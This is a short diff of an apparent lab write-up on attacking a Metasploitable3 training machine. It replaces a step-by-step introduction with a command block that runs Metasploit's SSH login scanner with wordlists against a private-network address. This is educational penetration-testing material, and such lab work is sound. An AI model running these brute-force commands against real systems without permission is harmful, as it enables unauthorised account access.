@@ -17,15 +17,17 @@ This document Show a **detailed step-by-step guide** to compromising the **Metas
 
 ---
 
-# ✅ Task 1.1: Compromise Using Metasploit
+## 🔍 Task 1.1: Using Metasploit Framework
 
-In this task, we targeted the **SSH service (port 22)** on Metasploitable3 using **Metasploit's brute-force module.**
+We performed an SSH brute-force attack using the Metasploit framework.
 
----
-
-## 🔧 Step 1: Launch Metasploit
-
-Open a terminal on your Kali Linux machine and enter the following command to start Metasploit:
+### **Commands Used:**
 
 ```bash
 msfconsole
+use auxiliary/scanner/ssh/ssh_login
+show options
+set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+set user_file /usr/share/wordlists/metasploit/unix_users.txt
+set rhosts 192.168.56.101
+exploit
